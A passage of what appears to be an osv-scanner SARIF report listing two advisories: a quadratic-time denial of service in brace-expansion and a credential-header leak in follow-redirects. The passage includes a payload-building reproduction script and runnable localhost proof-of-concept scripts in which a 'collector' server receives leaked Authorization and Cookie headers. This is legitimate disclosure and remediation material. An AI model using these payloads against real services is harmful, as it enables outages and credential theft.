              "fullDescription": {
                "markdown": "### Summary\n\nExpanding `{a},b}`-shaped input takes time quadratic in the number of literal `}` characters, blocking the event loop.\n\nBash preserves a quirk where a brace group followed by a comma set still expands (`{a},b}`). The parser implements this by rewriting the string and restarting the scan. Each pass absorbs exactly one `}` and re-scans from the beginning, so `n` trailing braces cost `n` full passes.\n\n### Reproduction\n\n```js\nconst build = n =\u003e '{a}' + '}'.repeat(n) + ',z}'\n\nfor (const n of [8000, 16000, 32000, 64000, 128000]) {\n  const t = Date.now()\n  expand(build(n))\n  console.log(n, Date.now() - t + 'ms')\n}\n```\n\n| n | input | time | results |\n|---|---|---|---|\n| 8,000 | 8 KB | 110 ms | 2 |\n| 16,000 | 16 KB | 446 ms | 2 |\n| 32,000 | 32 KB | 1.7 s | 2 |\n| 64,000 | 64 KB | 6.9 s | 2 |\n| 128,000 | 128 KB | **27.7 s** | 2 |\n\n`ms/n^2` is flat at ~1.7 and each doubling of `n` costs exactly 4.0x - quadratic. 128 KB of input blocks the event loop for nearly half a minute to produce two results.\n\n### Mechanism\n\nInstrumenting the rewrite branch confirms it runs exactly `n + 1` times, once per literal `}`, each re-scanning the whole string.\n\nThere is a second multiplier. The rewrite replaces the group's closing `}` with the internal `escClose` sentinel, which is `'\\0CLOSE' + Math.random() + '\\0'` - about 25 characters. The working string therefore *grows* by ~25 characters on every pass:\n\n| n | input length | final string length |\n|---|---|---|\n| 1,000 | 1,006 | 26,006 |\n| 8,000 | 8,006 | 208,006 |\n\nSo the input is inflated roughly 26x, and that factor multiplies both the quadratic constant and peak memory. This makes it partly a memory-pressure issue as well as a CPU one.\n\n### Why `max` and `maxLength` do not help\n\nThe cost is in parsing, before the result set exists. The payload yields 2 results regardless of size, so neither bound is ever reached.\n\n### Impact\n\nAn application passing an untrusted pattern to `expand()`, directly or through `minimatch` / `glob`, can have its event loop blocked for tens of seconds by a payload well under minimatch's 65,536-character cap. For a single-threaded Node server that is a full stall, not just a slow request.\n\nDegraded availability rather than a crash - the process recovers once the expansion completes.\n\n### Affected versions\n\nVerified affected on 1.1.18, 2.1.4, 3.0.6 and 5.0.9, all within a few percent of each other (~460-490 ms at n=16,000).\n\n### Patch\n\nThe rewrite loop gets an iteration bound. Past the cap the remaining string is treated as non-expanding and returned literally, consistent with the existing `max` / `maxLength` caps, which truncate rather than throw.\n\nNote this bounds the number of passes, not the cost of each: worst-case work remains proportional to `cap x input length`. The cap is set low enough that the residual is bounded in practice, and far above what any realistic `{a},b}` input needs.\n\n### Severity note\n\nScored 5.3 Medium (`A:L`) for consistency with GHSA-3jxr-9vmj-r5cp, the other algorithmic-complexity advisory on this package (CWE-407), which uses the same vector. The stack-exhaustion advisories on this package score `A:H` because they crash the process outright; this one stalls it.",
                "text": "### Summary\n\nExpanding `{a},b}`-shaped input takes time quadratic in the number of literal `}` characters, blocking the event loop.\n\nBash preserves a quirk where a brace group followed by a comma set still expands (`{a},b}`). The parser implements this by rewriting the string and restarting the scan. Each pass absorbs exactly one `}` and re-scans from the beginning, so `n` trailing braces cost `n` full passes.\n\n### Reproduction\n\n```js\nconst build = n =\u003e '{a}' + '}'.repeat(n) + ',z}'\n\nfor (const n of [8000, 16000, 32000, 64000, 128000]) {\n  const t = Date.now()\n  expand(build(n))\n  console.log(n, Date.now() - t + 'ms')\n}\n```\n\n| n | input | time | results |\n|---|---|---|---|\n| 8,000 | 8 KB | 110 ms | 2 |\n| 16,000 | 16 KB | 446 ms | 2 |\n| 32,000 | 32 KB | 1.7 s | 2 |\n| 64,000 | 64 KB | 6.9 s | 2 |\n| 128,000 | 128 KB | **27.7 s** | 2 |\n\n`ms/n^2` is flat at ~1.7 and each doubling of `n` costs exactly 4.0x - quadratic. 128 KB of input blocks the event loop for nearly half a minute to produce two results.\n\n### Mechanism\n\nInstrumenting the rewrite branch confirms it runs exactly `n + 1` times, once per literal `}`, each re-scanning the whole string.\n\nThere is a second multiplier. The rewrite replaces the group's closing `}` with the internal `escClose` sentinel, which is `'\\0CLOSE' + Math.random() + '\\0'` - about 25 characters. The working string therefore *grows* by ~25 characters on every pass:\n\n| n | input length | final string length |\n|---|---|---|\n| 1,000 | 1,006 | 26,006 |\n| 8,000 | 8,006 | 208,006 |\n\nSo the input is inflated roughly 26x, and that factor multiplies both the quadratic constant and peak memory. This makes it partly a memory-pressure issue as well as a CPU one.\n\n### Why `max` and `maxLength` do not help\n\nThe cost is in parsing, before the result set exists. The payload yields 2 results regardless of size, so neither bound is ever reached.\n\n### Impact\n\nAn application passing an untrusted pattern to `expand()`, directly or through `minimatch` / `glob`, can have its event loop blocked for tens of seconds by a payload well under minimatch's 65,536-character cap. For a single-threaded Node server that is a full stall, not just a slow request.\n\nDegraded availability rather than a crash - the process recovers once the expansion completes.\n\n### Affected versions\n\nVerified affected on 1.1.18, 2.1.4, 3.0.6 and 5.0.9, all within a few percent of each other (~460-490 ms at n=16,000).\n\n### Patch\n\nThe rewrite loop gets an iteration bound. Past the cap the remaining string is treated as non-expanding and returned literally, consistent with the existing `max` / `maxLength` caps, which truncate rather than throw.\n\nNote this bounds the number of passes, not the cost of each: worst-case work remains proportional to `cap x input length`. The cap is set low enough that the residual is bounded in practice, and far above what any realistic `{a},b}` input needs.\n\n### Severity note\n\nScored 5.3 Medium (`A:L`) for consistency with GHSA-3jxr-9vmj-r5cp, the other algorithmic-complexity advisory on this package (CWE-407), which uses the same vector. The stack-exhaustion advisories on this package score `A:H` because they crash the process outright; this one stalls it."
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-102277](https://osv.dev/CVE-2026-102277)**.\n\n## [GHSA-q2hr-2g5m-vwhr](https://osv.dev/GHSA-q2hr-2g5m-vwhr)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e Expanding `{a},b}`-shaped input takes time quadratic in the number of literal `}` characters, blocking the event loop.\n\u003e \n\u003e Bash preserves a quirk where a brace group followed by a comma set still expands (`{a},b}`). The parser implements this by rewriting the string and restarting the scan. Each pass absorbs exactly one `}` and re-scans from the beginning, so `n` trailing braces cost `n` full passes.\n\u003e \n\u003e ### Reproduction\n\u003e \n\u003e ```js\n\u003e const build = n =\u003e '{a}' + '}'.repeat(n) + ',z}'\n\u003e \n\u003e for (const n of [8000, 16000, 32000, 64000, 128000]) {\n\u003e   const t = Date.now()\n\u003e   expand(build(n))\n\u003e   console.log(n, Date.now() - t + 'ms')\n\u003e }\n\u003e ```\n\u003e \n\u003e | n | input | time | results |\n\u003e |---|---|---|---|\n\u003e | 8,000 | 8 KB | 110 ms | 2 |\n\u003e | 16,000 | 16 KB | 446 ms | 2 |\n\u003e | 32,000 | 32 KB | 1.7 s | 2 |\n\u003e | 64,000 | 64 KB | 6.9 s | 2 |\n\u003e | 128,000 | 128 KB | **27.7 s** | 2 |\n\u003e \n\u003e `ms/n^2` is flat at ~1.7 and each doubling of `n` costs exactly 4.0x - quadratic. 128 KB of input blocks the event loop for nearly half a minute to produce two results.\n\u003e \n\u003e ### Mechanism\n\u003e \n\u003e Instrumenting the rewrite branch confirms it runs exactly `n + 1` times, once per literal `}`, each re-scanning the whole string.\n\u003e \n\u003e There is a second multiplier. The rewrite replaces the group's closing `}` with the internal `escClose` sentinel, which is `'\\0CLOSE' + Math.random() + '\\0'` - about 25 characters. The working string therefore *grows* by ~25 characters on every pass:\n\u003e \n\u003e | n | input length | final string length |\n\u003e |---|---|---|\n\u003e | 1,000 | 1,006 | 26,006 |\n\u003e | 8,000 | 8,006 | 208,006 |\n\u003e \n\u003e So the input is inflated roughly 26x, and that factor multiplies both the quadratic constant and peak memory. This makes it partly a memory-pressure issue as well as a CPU one.\n\u003e \n\u003e ### Why `max` and `maxLength` do not help\n\u003e \n\u003e The cost is in parsing, before the result set exists. The payload yields 2 results regardless of size, so neither bound is ever reached.\n\u003e \n\u003e ### Impact\n\u003e \n\u003e An application passing an untrusted pattern to `expand()`, directly or through `minimatch` / `glob`, can have its event loop blocked for tens of seconds by a payload well under minimatch's 65,536-character cap. For a single-threaded Node server that is a full stall, not just a slow request.\n\u003e \n\u003e Degraded availability rather than a crash - the process recovers once the expansion completes.\n\u003e \n\u003e ### Affected versions\n\u003e \n\u003e Verified affected on 1.1.18, 2.1.4, 3.0.6 and 5.0.9, all within a few percent of each other (~460-490 ms at n=16,000).\n\u003e \n\u003e ### Patch\n\u003e \n\u003e The rewrite loop gets an iteration bound. Past the cap the remaining string is treated as non-expanding and returned literally, consistent with the existing `max` / `maxLength` caps, which truncate rather than throw.\n\u003e \n\u003e Note this bounds the number of passes, not the cost of each: worst-case work remains proportional to `cap x input length`. The cap is set low enough that the residual is bounded in practice, and far above what any realistic `{a},b}` input needs.\n\u003e \n\u003e ### Severity note\n\u003e \n\u003e Scored 5.3 Medium (`A:L`) for consistency with GHSA-3jxr-9vmj-r5cp, the other algorithmic-complexity advisory on this package (CWE-407), which uses the same vector. The stack-exhaustion advisories on this package score `A:H` because they crash the process outright; this one stalls it.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/tools/emoji-precache/package-lock.json | brace-expansion | 1.1.12 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | brace-expansion | 1.1.18 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | brace-expansion | 2.1.4 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | brace-expansion | 5.0.9 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | brace-expansion | 1.1.18 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | brace-expansion | 2.1.4 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | brace-expansion | 5.0.8 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | brace-expansion | 5.0.9 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-q2hr-2g5m-vwhr | brace-expansion | 1.1.21, 2.1.7, 3.0.9, 5.0.12 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/tools/emoji-precache/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-102277\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-102277\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-102277\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-102277](https://osv.dev/CVE-2026-102277)**.\n\n## [GHSA-q2hr-2g5m-vwhr](https://osv.dev/GHSA-q2hr-2g5m-vwhr)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e Expanding `{a},b}`-shaped input takes time quadratic in the number of literal `}` characters, blocking the event loop.\n\u003e \n\u003e Bash preserves a quirk where a brace group followed by a comma set still expands (`{a},b}`). The parser implements this by rewriting the string and restarting the scan. Each pass absorbs exactly one `}` and re-scans from the beginning, so `n` trailing braces cost `n` full passes.\n\u003e \n\u003e ### Reproduction\n\u003e \n\u003e ```js\n\u003e const build = n =\u003e '{a}' + '}'.repeat(n) + ',z}'\n\u003e \n\u003e for (const n of [8000, 16000, 32000, 64000, 128000]) {\n\u003e   const t = Date.now()\n\u003e   expand(build(n))\n\u003e   console.log(n, Date.now() - t + 'ms')\n\u003e }\n\u003e ```\n\u003e \n\u003e | n | input | time | results |\n\u003e |---|---|---|---|\n\u003e | 8,000 | 8 KB | 110 ms | 2 |\n\u003e | 16,000 | 16 KB | 446 ms | 2 |\n\u003e | 32,000 | 32 KB | 1.7 s | 2 |\n\u003e | 64,000 | 64 KB | 6.9 s | 2 |\n\u003e | 128,000 | 128 KB | **27.7 s** | 2 |\n\u003e \n\u003e `ms/n^2` is flat at ~1.7 and each doubling of `n` costs exactly 4.0x - quadratic. 128 KB of input blocks the event loop for nearly half a minute to produce two results.\n\u003e \n\u003e ### Mechanism\n\u003e \n\u003e Instrumenting the rewrite branch confirms it runs exactly `n + 1` times, once per literal `}`, each re-scanning the whole string.\n\u003e \n\u003e There is a second multiplier. The rewrite replaces the group's closing `}` with the internal `escClose` sentinel, which is `'\\0CLOSE' + Math.random() + '\\0'` - about 25 characters. The working string therefore *grows* by ~25 characters on every pass:\n\u003e \n\u003e | n | input length | final string length |\n\u003e |---|---|---|\n\u003e | 1,000 | 1,006 | 26,006 |\n\u003e | 8,000 | 8,006 | 208,006 |\n\u003e \n\u003e So the input is inflated roughly 26x, and that factor multiplies both the quadratic constant and peak memory. This makes it partly a memory-pressure issue as well as a CPU one.\n\u003e \n\u003e ### Why `max` and `maxLength` do not help\n\u003e \n\u003e The cost is in parsing, before the result set exists. The payload yields 2 results regardless of size, so neither bound is ever reached.\n\u003e \n\u003e ### Impact\n\u003e \n\u003e An application passing an untrusted pattern to `expand()`, directly or through `minimatch` / `glob`, can have its event loop blocked for tens of seconds by a payload well under minimatch's 65,536-character cap. For a single-threaded Node server that is a full stall, not just a slow request.\n\u003e \n\u003e Degraded availability rather than a crash - the process recovers once the expansion completes.\n\u003e \n\u003e ### Affected versions\n\u003e \n\u003e Verified affected on 1.1.18, 2.1.4, 3.0.6 and 5.0.9, all within a few percent of each other (~460-490 ms at n=16,000).\n\u003e \n\u003e ### Patch\n\u003e \n\u003e The rewrite loop gets an iteration bound. Past the cap the remaining string is treated as non-expanding and returned literally, consistent with the existing `max` / `maxLength` caps, which truncate rather than throw.\n\u003e \n\u003e Note this bounds the number of passes, not the cost of each: worst-case work remains proportional to `cap x input length`. The cap is set low enough that the residual is bounded in practice, and far above what any realistic `{a},b}` input needs.\n\u003e \n\u003e ### Severity note\n\u003e \n\u003e Scored 5.3 Medium (`A:L`) for consistency with GHSA-3jxr-9vmj-r5cp, the other algorithmic-complexity advisory on this package (CWE-407), which uses the same vector. The stack-exhaustion advisories on this package score `A:H` because they crash the process outright; this one stalls it.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/tools/emoji-precache/package-lock.json | brace-expansion | 1.1.12 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | brace-expansion | 1.1.18 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | brace-expansion | 2.1.4 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | brace-expansion | 5.0.9 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | brace-expansion | 1.1.18 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | brace-expansion | 2.1.4 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | brace-expansion | 5.0.8 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | brace-expansion | 5.0.9 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-q2hr-2g5m-vwhr | brace-expansion | 1.1.21, 2.1.7, 3.0.9, 5.0.12 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/tools/emoji-precache/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-102277\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-102277\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-102277\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-102277",
              "name": "CVE-2026-102277",
              "properties": {
                "security-severity": "5.3"
              },
              "relationships": [],
              "shortDescription": {
                "markdown": "CVE-2026-102277: brace-expansion: Quadratic-time expansion of the `{a},b}` rewrite causes CPU denial of service",
                "text": "CVE-2026-102277: brace-expansion: Quadratic-time expansion of the `{a},b}` rewrite causes CPU denial of service"
              }
            },
            {
              "deprecatedIds": [
                "CVE-2026-111756",
                "GHSA-q3jh-wrc6-jgq8"
              ],
              "fullDescription": {
                "markdown": "### Summary\nfollow-redirects removes sensitive credential headers (Authorization, Proxy-Authorization, Cookie, and any caller-declared `sensitiveHeaders`) before following a redirect that crosses to a different host or downgrades to a less secure protocol. The removal routine iterates the caller's headers container with `for...in` and matches header names against a filter. This assumes the headers container is a plain object keyed by header names. Node's underlying `http.request`, which follow-redirects is a drop-in replacement for, also accepts headers as an alternating array of names and values. For an array, `for...in` yields the numeric indices `\"0\"`, `\"1\"`, `\"2\"` and so on, which never match a header-name filter, so nothing is removed. An application that sends array-form headers and follows an attacker-controlled cross-origin redirect therefore forwards its Authorization, Cookie, and Proxy-Authorization headers verbatim to the attacker-controlled destination, with no error or warning. The `sensitiveHeaders` option added to fix CVE-2026-40895 / GHSA-r4q5-vmmm-2653 is equally ineffective, because it relies on the same helper. This is an unauthenticated confidentiality vulnerability: any remote server the victim application contacts can harvest the victim's credential headers by responding with a cross-origin redirect.\n\n### Details\nThe cross-origin credential-stripping control is implemented by `removeMatchingHeaders(regex, headers)` at `index.js:630-640`:\n\n```js\nfunction removeMatchingHeaders(regex, headers) {\n  var lastValue;\n  for (var header in headers) {          // for...in over an ARRAY yields \"0\",\"1\",\"2\"...\n    if (regex.test(header)) {            // the header-name filter never matches a numeric index\n      lastValue = headers[header];\n      delete headers[header];\n    }\n  }\n  return (lastValue === null || typeof lastValue === \"undefined\") ?\n    undefined : String(lastValue).trim();\n}\n```\n\nIt is invoked from `_processResponse` for three purposes, all with the caller-supplied `this._options.headers`:\n\n- `index.js:490` - strip the credential filter (`this._headerFilter`, which covers the built-in list Authorization/Proxy-Authorization/Cookie plus any `sensitiveHeaders`) when the redirect crosses origin or downgrades protocol.\n- `index.js:470` - strip the `Host` header (`/^host$/i`).\n- `index.js:466` - strip `content-*` headers when a 301/302/303 converts POST to GET.\n\nThe caller-supplied headers container is passed straight through to each redirected request via `nativeProtocol.request(this._options)` at `index.js:352`. `_sanitizeOptions` (index.js:300-331) only replaces `options.headers` when it is falsy, so an array is left untouched.\n\nNode's `http.request` accepts `options.headers` as an alternating array of names and values (for example `[\"Authorization\", \"Bearer ...\", \"Cookie\", \"session=...\"]`). This is a supported way to control header ordering and duplication. For such an array, `for (var header in headers)` iterates the numeric indices `\"0\"`, `\"1\"`, `\"2\"`, and the header-name regex never matches any of them, so `removeMatchingHeaders` deletes nothing. Every one of the three strip operations above silently no-ops:\n\n- The built-in credential headers (Authorization, Cookie, Proxy-Authorization) are forwarded to the cross-origin redirect target.\n- Any `sensitiveHeaders` the caller declared are forwarded too.\n- The stale `Host` of the previous origin is re-sent to the new origin.\n- On a POST-to-GET redirect the `content-*` headers are retained, leaving `Content-Length` inconsistent with the now-empty body.\n\nThe primary and highest-impact consequence is disclosure of credential headers. The stale `Host` re-send and the `Content-Length` inconsistency are secondary correctness defects arising from the same root cause.\n\nRoot-cause history: the `for...in`-based `removeMatchingHeaders` used for the built-in credential strip has been present since the cross-host Authorization drop was introduced (commit `724087d`, first released in v1.11.0) and is unchanged through 1.16.0. The `sensitiveHeaders` layer was introduced in 1.16.0 (commit `844c4d3`). The behavior was verified directly on both 1.15.11 and 1.16.0.\n\nSuggested remediation: handle or explicitly reject Node's array-form headers. The strictest fix is to detect `Array.isArray(options.headers)` in `_sanitizeOptions` and throw a clear `TypeError` instructing callers to pass an object, so misuse fails loudly instead of silently downgrading security. If array support is desired, extend `removeMatchingHeaders` to walk the array in name/value pairs:\n\n```js\nfunction removeMatchingHeaders(regex, headers) {\n  if (Array.isArray(headers)) {\n    var lastValue;\n    for (var i = 0; i \u003c headers.length; i += 2) {\n      if (regex.test(headers[i])) { lastValue = headers[i + 1]; headers.splice(i, 2); i -= 2; }\n    }\n    return (lastValue === null || typeof lastValue === \"undefined\") ? undefined : String(lastValue).trim();\n  }\n  // existing object logic\n}\n```\n\nApply the same guard to the `Host` and `content-*` removal paths. Add regression tests that exercise array-form headers across a cross-origin redirect; the current suite only covers object-form headers.\n\nReferences:\n- https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-r4q5-vmmm-2653\n- https://github.com/follow-redirects/follow-redirects/commit/724087d696c0bcd55c13ee0f3560c4558138e422\n- https://github.com/follow-redirects/follow-redirects/commit/844c4d3 (sensitiveHeaders option)\n\n### PoC\nEnvironment: Node.js v24.18.0 on Windows 11. The underlying Node array-header behavior is long-standing and not version-specific. Run each script from a checkout of follow-redirects at 1.16.0 so that `require(\"./index.js\")` resolves to the library under test.\n\nPrecondition check (Node accepts and serializes array-form headers):\n```\nnode -e 'var http=require(\"http\");var s=http.createServer((q,r)=\u003er.end(JSON.stringify(q.headers)));s.listen(0,\"127.0.0.1\",()=\u003e{var p=s.address().port;http.request({hostname:\"127.0.0.1\",port:p,headers:[\"Authorization\",\"Bearer T\",\"Cookie\",\"c=1\"]},res=\u003e{var b=\"\";res.on(\"data\",c=\u003eb+=c);res.on(\"end\",()=\u003e{console.log(JSON.parse(b).authorization, JSON.parse(b).cookie);s.close();});}).end();});'\n```\nObserved: `Bearer T c=1` (the server receives both headers, confirming array form is valid and delivered).\n\nMinimal form (built-in credential list), `arrayleak.js`:\n```js\nvar followRedirects = require(\"./index.js\");\nvar http = require(\"http\");\nvar redirector = http.createServer(function (req, res) {\n  req.resume();\n  res.writeHead(302, { Location: \"http://127.0.0.1:47302/steal\" });   // cross-origin (different port)\n  res.end();\n});\nvar collector = http.createServer(function (req, res) {\n  res.end(JSON.stringify(req.headers));                                // attacker-controlled target\n});\nredirector.listen(47301, \"127.0.0.1\", function () {\n  collector.listen(47302, \"127.0.0.1\", function () {\n    followRedirects.http.request({\n      hostname: \"127.0.0.1\", port: 47301, path: \"/\", method: \"GET\",\n      headers: [\n        \"Host\", \"127.0.0.1:47301\",\n        \"Authorization\", \"Bearer ARRAY-FORM-VICTIM-TOKEN\",\n        \"Cookie\", \"session=ARRAY-FORM-SESSION-ID\",\n        \"X-Custom\", \"harmless\"\n      ]\n    }, function (res) {\n      var body = \"\"; res.on(\"data\", function (c) { body += c; });\n      res.on(\"end\", function () {\n        var h = JSON.parse(body);\n        console.log(\"Authorization :\", h.authorization || \"(stripped - OK)\");\n        console.log(\"Cookie        :\", h.cookie || \"(stripped - OK)\");\n        redirector.close(); collector.close();\n      });\n    }).end();\n  });\n});\n```\nObserved output (1.16.0 and 1.15.11):\n```\nAuthorization : Bearer ARRAY-FORM-VICTIM-TOKEN     \u003c- credential LEAKED cross-origin\nCookie        : session=ARRAY-FORM-SESSION-ID      \u003c- credential LEAKED cross-origin\n```\nControl: replacing `headers` with the equivalent object `{ Host: ..., Authorization: ..., Cookie: ... }` and re-running strips both correctly, proving the strip branch executes and only the array iteration defeats it.\n\nCombined form (built-in list plus the 1.16.0 `sensitiveHeaders` fix, all defeated in one request), `combined.js`:\n```js\nvar followRedirects = require(\"./index.js\");\nvar http = require(\"http\");\nvar redirector = http.createServer(function (req, res) {\n  req.resume();\n  res.writeHead(302, { Location: \"http://127.0.0.1:47402/steal\" });\n  res.end();\n});\nvar collector = http.createServer(function (req, res) { res.end(JSON.stringify(req.headers)); });\nredirector.listen(47401, \"127.0.0.1\", function () {\n  collector.listen(47402, \"127.0.0.1\", function () {\n    followRedirects.http.request({\n      hostname: \"127.0.0.1\", port: 47401, path: \"/\", method: \"GET\",\n      headers: [\n        \"Host\", \"127.0.0.1:47401\",\n        \"Authorization\", \"Bearer BUILTIN-VICTIM-TOKEN\",\n        \"Cookie\", \"session=BUILTIN-SESSION-ID\",\n        \"X-API-Key\", \"DECLARED-VICTIM-KEY\"\n      ],\n      sensitiveHeaders: [\"X-API-Key\"]\n    }, function (res) {\n      var body = \"\"; res.on(\"data\", function (c) { body += c; }); res.on(\"end\", function () {\n        var h = JSON.parse(body);\n        console.log(\"Authorization (built-in list) :\", h.authorization || \"(stripped - OK)\");\n        console.log(\"Cookie (built-in list)        :\", h.cookie || \"(stripped - OK)\");\n        console.log(\"X-API-Key (sensitiveHeaders)  :\", h[\"x-api-key\"] || \"(stripped - OK)\");\n        redirector.close(); collector.close();\n      });\n    }).end();\n  });\n});\n```\nObserved output (1.16.0):\n```\nAuthorization (built-in list) : Bearer BUILTIN-VICTIM-TOKEN     \u003c- LEAKED\nCookie (built-in list)        : session=BUILTIN-SESSION-ID      \u003c- LEAKED\nX-API-Key (sensitiveHeaders)  : DECLARED-VICTIM-KEY             \u003c- LEAKED (the CVE-2026-40895 fix defeated)\n```\n\nProtocol-downgrade branch (credentials transit in cleartext), `downgrade.js`, using the repository's own test certificate at `test/assets/`:\n```js\nvar followRedirects = require(\"./index.js\");\nvar http = require(\"http\"); var https = require(\"https\"); var fs = require(\"fs\");\nvar opts = { key: fs.readFileSync(\"test/assets/localhost.key\"), cert: fs.readFileSync(\"test/assets/localhost.crt\") };\nvar ca = fs.readFileSync(\"test/assets/ca.crt\");\nvar httpsOrigin = https.createServer(opts, function (req, res) {\n  req.resume(); res.writeHead(302, { Location: \"http://localhost:47502/steal\" }); res.end();\n});\nvar httpCollector = http.createServer(function (req, res) { res.end(JSON.stringify(req.headers)); });\nhttpsOrigin.listen(47501, \"localhost\", function () {\n  httpCollector.listen(47502, \"localhost\", function () {\n    followRedirects.https.request({\n      hostname: \"localhost\", port: 47501, path: \"/\", method: \"GET\", ca: ca,\n      headers: [\"Host\", \"localhost:47501\", \"Authorization\", \"Bearer DOWNGRADE-TOKEN\", \"Cookie\", \"session=DOWNGRADE-SESSION\"]\n    }, function (res) {\n      var body = \"\"; res.on(\"data\", function (c) { body += c; });\n      res.on(\"end\", function () {\n        var h = JSON.parse(body);\n        console.log(\"Authorization :\", h.authorization || \"(stripped - OK)\");\n        console.log(\"Cookie        :\", h.cookie || \"(stripped - OK)\");\n        httpsOrigin.close(); httpCollector.close();\n      });\n    }).end();\n  });\n});\n```\nObserved output (1.16.0): both credentials received at the plaintext HTTP target after an HTTPS-to-HTTP redirect, meaning they transit unencrypted and are harvestable by any on-path network observer, not only the redirect destination.\n\nSide-effect verification (stale Host re-sent, Content-Length inconsistent): a POST request with array-form headers and a 13-byte body that receives a 302 to a different origin was observed to arrive at the new origin as a GET carrying the stale `Host` of the first origin and `Content-Length: 13` despite an empty body.\n\n### Impact\nThis is an information-disclosure vulnerability: silent failure of the cross-origin credential-header stripping control. Who is impacted: any application, or upstream library, that calls follow-redirects with Node's array-form headers (used to control header ordering or duplication) and follows a redirect whose target is controlled or compromised by an attacker. When triggered, the victim's Authorization, Cookie, and Proxy-Authorization headers, and any headers declared through the `sensitiveHeaders` option, are disclosed to the attacker-controlled destination. In the protocol-downgrade case the credentials additionally traverse the network in cleartext, exposing them to on-path observers. No authentication or user interaction is required of the attacker beyond controlling a redirect target the victim already contacts. The control that is defeated is the same one that prior advisories in this library (CVE-2022-0155, CVE-2022-0536, CVE-2026-40895 / GHSA-r4q5-vmmm-2653) were issued to establish and harden.",
                "text": "### Summary\nfollow-redirects removes sensitive credential headers (Authorization, Proxy-Authorization, Cookie, and any caller-declared `sensitiveHeaders`) before following a redirect that crosses to a different host or downgrades to a less secure protocol. The removal routine iterates the caller's headers container with `for...in` and matches header names against a filter. This assumes the headers container is a plain object keyed by header names. Node's underlying `http.request`, which follow-redirects is a drop-in replacement for, also accepts headers as an alternating array of names and values. For an array, `for...in` yields the numeric indices `\"0\"`, `\"1\"`, `\"2\"` and so on, which never match a header-name filter, so nothing is removed. An application that sends array-form headers and follows an attacker-controlled cross-origin redirect therefore forwards its Authorization, Cookie, and Proxy-Authorization headers verbatim to the attacker-controlled destination, with no error or warning. The `sensitiveHeaders` option added to fix CVE-2026-40895 / GHSA-r4q5-vmmm-2653 is equally ineffective, because it relies on the same helper. This is an unauthenticated confidentiality vulnerability: any remote server the victim application contacts can harvest the victim's credential headers by responding with a cross-origin redirect.\n\n### Details\nThe cross-origin credential-stripping control is implemented by `removeMatchingHeaders(regex, headers)` at `index.js:630-640`:\n\n```js\nfunction removeMatchingHeaders(regex, headers) {\n  var lastValue;\n  for (var header in headers) {          // for...in over an ARRAY yields \"0\",\"1\",\"2\"...\n    if (regex.test(header)) {            // the header-name filter never matches a numeric index\n      lastValue = headers[header];\n      delete headers[header];\n    }\n  }\n  return (lastValue === null || typeof lastValue === \"undefined\") ?\n    undefined : String(lastValue).trim();\n}\n```\n\nIt is invoked from `_processResponse` for three purposes, all with the caller-supplied 